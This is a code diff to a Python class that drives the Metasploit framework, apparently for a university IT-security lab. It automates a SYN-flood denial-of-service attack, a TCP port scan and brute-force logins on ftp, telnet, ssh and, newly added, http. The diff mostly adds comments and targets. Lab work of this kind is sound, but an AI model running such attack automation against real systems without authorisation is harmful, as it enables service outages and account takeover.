@@ -12,7 +12,7 @@ class Metasploit:
         self.cid = self.client.consoles.console().cid
 
     # Start a denial-of-service (dos) attack
-    # It sends a bunch of tcp handshakes to the target
+    # It sends a bunch of tcp handshakes (syn packages) to the target
     def dos_attack(self, ip: str, port: int):
         exploit = self.client.modules.use('auxiliary', 'dos/tcp/synflood')
         exploit['RHOSTS'] = ip
@@ -20,12 +20,14 @@ class Metasploit:
         exploit['INTERFACE'] = 'wlan0'
         exploit['NUM'] = 500
         print(exploit.description)
+        print(f'Attacking {ip} on port {port}')
         print(self.client.consoles.console(self.cid).run_module_with_output(exploit))
 
+    # Checks for open tcp ports, specified in 'PORTS'
     def tcp_portscan_attack(self, ip: str):
         exploit = self.client.modules.use('auxiliary', 'scanner/portscan/tcp')
         exploit['RHOSTS'] = ip
-        exploit['PORTS'] = '22-25,80,443,6668,8080'
+        exploit['PORTS'] = '22-25,80,443, 1883, 6668,8080'
 
         output = self.client.consoles.console(self.cid).run_module_with_output(exploit)
         print(output)
@@ -39,7 +41,7 @@ class Metasploit:
 
 
 
-    # Brute-force login attack on ftp, telnet and ssh
+    # Brute-force login attack on ftp, telnet, ssh and http
     def brute_force_login(self, ip: str, service: str):
         if(service == 'ftp'):
             exploit = self.client.modules.use('auxiliary', 'scanner/ftp/ftp_login')
@@ -47,6 +49,8 @@ class Metasploit:
             exploit = self.client.modules.use('auxiliary', 'scanner/telnet/telnet_login')
         elif(service == 'ssh'):
             exploit = self.client.modules.use('auxiliary', 'scanner/ssh/ssh_login')
+        elif(service == 'http'):
+            exploit = self.client.modules.use('auxiliary', 'scanner/http/http_login')
         exploit['RHOSTS'] = ip
         exploit['USERPASS_FILE'] = '/home/kali/git/it-sicherheit-prakitkum/user_pass.txt'
         print(self.client.consoles.console(self.cid).run_module_with_output(exploit))
